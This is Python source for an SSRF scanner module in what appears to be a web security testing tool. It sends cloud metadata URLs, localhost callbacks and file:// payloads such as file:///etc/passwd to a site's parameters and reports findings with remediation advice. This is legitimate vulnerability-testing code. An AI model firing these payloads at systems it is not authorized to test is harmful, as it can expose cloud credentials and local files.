"""Server-Side Request Forgery (SSRF) vulnerability scanner."""

import requests
import logging
from typing import List, Optional
from urllib.parse import urlparse, urljoin, quote
import time

from .base import BaseScanner
from ..models.scan import ScanTarget
from ..models.finding import Finding, FindingSeverity, FindingCategory
from ..models.scan_mode import ScanMode
from ..utils.evidence_collector import EvidenceCollector

logger = logging.getLogger(__name__)


class SSRFScanner(BaseScanner):
    """Test for SSRF vulnerabilities."""
    
    def __init__(self, enabled: bool = True, scan_mode: ScanMode = ScanMode.OFFENSIVE):
        """Initialize SSRF scanner."""
        super().__init__(
            name="ssrf_scanner",
            command=None,  # Python-based
            enabled=enabled,
            scan_mode=scan_mode
        )
        # Use OPSEC-enabled session helper
        from ..utils.scanner_session import create_scanner_session
        self.session = create_scanner_session()
    
    def scan(self, target: ScanTarget) -> List[Finding]:
        """Test for SSRF vulnerabilities."""
        findings = []
        
        if not self.is_available():
            return findings
        
        # Only run in offensive mode
        if self.scan_mode == ScanMode.DEFENSIVE:
            return findings
        
        try:
            # Discover parameters first
            params = self._discover_parameters(target.url)
            
            # Only use discovered parameters that are URL-like
            # Don't fall back to common parameters - only test what we discovered
            if not params:
                logger.debug("No parameters discovered, skipping SSRF tests")
                return findings
            
            findings.extend(self._test_ssrf(target.url, params))
            findings.extend(self._test_ssrf_webhooks(target.url))
            findings.extend(self._test_ssrf_file_protocols(target.url, params))
            # Note: Cloud metadata and internal scanning tests are integrated into _test_ssrf
            
        except Exception as e:
            logger.error(f"SSRF scanning failed: {e}", exc_info=True)
        
        return findings
    
    def _discover_parameters(self, url: str) -> List[str]:
        """Discover URL parameters from the page."""
        params = []
        
        try:
            response = self.session.get(url, timeout=10)
            content = response.text.lower()
            
            # Look for common parameter patterns in HTML
            import re
            # Find form inputs
            input_patterns = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', content)
            params.extend(input_patterns)
            
            # Find links with parameters
            link_patterns = re.findall(r'[?&]([^=&\s"\'<>]+)=', content)
            params.extend(link_patterns)
            
            # Remove duplicates
            params = list(set(params))
            
        except Exception as e:
            logger.debug(f"Parameter discovery error: {e}")
        
        return params
    
    def _test_ssrf(self, base_url: str, params: List[str]) -> List[Finding]:
        """Test for SSRF using various payloads with proper validation."""
        findings = []
        
        # Only test parameters that could plausibly accept URLs
        # Filter out non-URL parameters like email, id, family, format, etc.
        url_like_params = [
            'url', 'link', 'path', 'file', 'page', 'redirect', 'return', 'next', 
            'webhook', 'callback', 'api', 'endpoint', 'target', 'host', 'server',
            'source', 'destination', 'fetch', 'load', 'import', 'include'
        ]
        
        # Filter params to only include URL-like parameters
        filtered_params = [p for p in params if any(url_keyword in p.lower() for url_keyword in url_like_params)]
        
        if not filtered_params:
            # If no URL-like params found, skip SSRF testing
            logger.debug("No URL-like parameters found for SSRF testing")
            return findings
        
        # SSRF test payloads with DNS callback URL for out-of-band verification
        # We'll use a test endpoint that we can verify responded
        test_urls = [
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://metadata.google.internal/',  # GCP metadata
        ]
        
        # Baseline response for comparison
        try:
            baseline_response = self.session.get(base_url, timeout=5, allow_redirects=False)
            baseline_content = baseline_response.text.lower()
            baseline_time = baseline_response.elapsed.total_seconds()
        except:
            baseline_content = ""
            baseline_time = 0
        
        for param in filtered_params[:5]:  # Limit to 5 URL-like parameters
            for test_url in test_urls[:2]:  # Limit to 2 test URLs per parameter
                try:
                    import time
                    start_time = time.time()
                    
                    # Test GET parameter
                    test_params = {param: test_url}
                    response = self.session.get(base_url, params=test_params, timeout=10, allow_redirects=False)
                    elapsed_time = time.time() - start_time
                    
                    # STRICT validation: SSRF requires ALL of these:
                    # 1. Different response body/content (indicating backend made request)
                    # 2. OR significantly longer response time (>3s longer than baseline)
                    # 3. OR response contains metadata service indicators
                    # 4. OR response headers indicate internal request
                    
                    response_content = response.text.lower()
                    
                    # Check for actual metadata service response (strongest indicator)
                    metadata_indicators = [
                        'instance-id', 'ami-id', 'instance-type', 'availability-zone',
                        'compute.googleapis.com', 'metadata.google.internal',
                        'instance', 'compute', 'projects'
                    ]
                    has_metadata_content = any(indicator in response_content for indicator in metadata_indicators)
                    
                    # Check for significant timing difference
                    timing_delta = elapsed_time - baseline_time
                    significant_delay = timing_delta > 3.0
                    
                    # Check for connection error responses that suggest internal connection attempt
                    connection_error_indicators = [
                        'connection refused', 'connection timed out', 
                        'no route to host', 'name or service not known'
                    ]
                    has_connection_error = any(indicator in response_content for indicator in connection_error_indicators)
                    
                    # Check if response differs significantly from baseline (strong indicator)
                    content_differs = (
                        response_content != baseline_content and
                        len(response_content) > 100 and  # Non-trivial response
                        not (response_content.startswith(baseline_content[:50]) if len(baseline_content) > 50 else False)
                    )
                    
                    # Only report if we have STRONG evidence
                    if has_metadata_content or (significant_delay and content_differs):
                        evidence_parts = []
                        if has_metadata_content:
                            evidence_parts.append("Response contains cloud metadata indicators")
                        if significant_delay:
                            evidence_parts.append(f"Response time {elapsed_time:.2f}s (baseline: {baseline_time:.2f}s)")
                        if content_differs:
                            evidence_parts.append("Response content differs significantly from baseline")
                        
                        exploitation_details = f"Parameter '{param}' accepted URL '{test_url}'. " + "; ".join(evidence_parts) + f". Status code: {response.status_code}."
                        
                        # Collect evidence
                        evidence_data = EvidenceCollector.collect_request_response(
                            response,
                            request_url=f"{base_url}?{param}={quote(test_url)}",
                            request_method="GET"
                        )
                        evidence_str = EvidenceCollector.format_evidence_string(evidence_data)
                        evidence_str += f"\nTiming: {elapsed_time:.2f}s (baseline: {baseline_time:.2f}s)"
                        
                        findings.append(Finding(
                            title=f"SSRF Vulnerability Detected",
                            description=f"Parameter '{param}' appears to accept URLs and make server-side requests. Evidence: {', '.join(evidence_parts)}.",
                            severity=FindingSeverity.HIGH,
                            category=FindingCategory.VULNERABILITY,
                            source_scanner=self.name,
                            url=f"{base_url}?{param}={quote(test_url)}",
                            evidence=evidence_str,
                            remediation=f"URGENT: Validate and whitelist allowed URLs for parameter '{param}'. Block internal IPs (127.0.0.1, localhost), private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16), and metadata endpoints (169.254.169.254). Consider using a URL validation library.",
                            references=["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
                            exploitation_details=exploitation_details,
                        ))
                        break  # Only report once per parameter
                
                except requests.exceptions.Timeout:
                    # Timeout alone is NOT sufficient evidence - don't report
                    logger.debug(f"Timeout for {param}={test_url} - not reporting without additional evidence")
                    continue
                except Exception as e:
                    logger.debug(f"SSRF test error for {param}={test_url}: {e}")
                    continue
        
        return findings
    
    # Removed _check_ssrf_response - validation now done inline with stricter checks
    
    def _test_ssrf_webhooks(self, base_url: str) -> List[Finding]:
        """Test webhook endpoints for SSRF."""
        findings = []
        
        webhook_paths = ['/webhook', '/callback', '/hook', '/notify', '/ping', '/api/webhook']
        
        for path in webhook_paths:
            try:
                webhook_url = urljoin(base_url, path)
                
                # Test with internal URL
                test_payload = {
                    'url': 'http://127.0.0.1:80',
                    'callback': 'http://127.0.0.1:80',
                    'target': 'http://127.0.0.1:80',
                }
                
                response = self.session.post(webhook_url, json=test_payload, timeout=5)
                
                if response.status_code in [200, 202, 204]:
                    findings.append(Finding(
                        title="Webhook Endpoint Detected",
                        description=f"Webhook endpoint found at {path}. Verify it validates URLs to prevent SSRF.",
                        severity=FindingSeverity.INFO,
                        category=FindingCategory.FINGERPRINTING,
                        source_scanner=self.name,
                        url=webhook_url,
                        remediation="Ensure webhook endpoints validate and whitelist allowed callback URLs.",
                    ))
            except:
                continue
        
        return findings
    
    def _test_ssrf_file_protocols(self, base_url: str, params: List[str]) -> List[Finding]:
        """Test for SSRF using file:// protocol."""
        findings = []
        
        file_payloads = [
            'file:///etc/passwd',
            'file:///etc/hosts',
            'file:///windows/win.ini',
            'file:///c:/windows/win.ini',
        ]
        
        for param in params[:5]:  # Limit to 5 parameters
            for payload in file_payloads:
                try:
                    test_params = {param: payload}
                    response = self.session.get(base_url, params=test_params, timeout=5, allow_redirects=False)
                    
                    content = response.text.lower()
                    # Check for file content indicators
                    # Check for actual file content indicators with stronger validation
                    file_indicators = {
                        '/etc/passwd': ['root:', 'bin:', 'daemon:'],
                        '/etc/hosts': ['127.0.0.1', 'localhost', '::1'],
                        'win.ini': ['[extensions]', '[fonts]', '[mci extensions]'],
                    }
                    
                    found_file_content = False
                    detected_file = None
                    for file_path, indicators in file_indicators.items():
                        if any(indicator in content for indicator in indicators) and len(content) > 200:
                            # Verify it's actually file content, not just coincidence
                            # File should have multiple lines and typical structure
                            if '\n' in content and content.count('\n') > 3:
                                found_file_content = True
                                detected_file = file_path
                                break
                    
                    if found_file_content:
                        exploitation_details = f"Parameter '{param}' accepts file:// protocol. Local file '{detected_file}' content was retrieved. Status code: {response.status_code}."
                        
                        findings.append(Finding(
                            title="SSRF via File Protocol",
                            description=f"Parameter '{param}' allows file:// protocol access, enabling local file read via SSRF. Confirmed by retrieving content from {detected_file}.",
                            severity=FindingSeverity.HIGH,
                            category=FindingCategory.VULNERABILITY,
                            source_scanner=self.name,
                            url=f"{base_url}?{param}={quote(payload)}",
                            evidence=f"Request: {base_url}?{param}={quote(payload)}\nResponse contains file content indicators from {detected_file}",
                            remediation=f"URGENT: Block file:// protocol and validate URLs for parameter '{param}'. Only allow http:// and https:// protocols, and whitelist allowed domains.",
                            exploitation_details=exploitation_details,
                        ))
                        break
                except:
                    continue
        
        return findings
    
    def is_available(self) -> bool:
        """SSRF scanner is always available."""
        return True

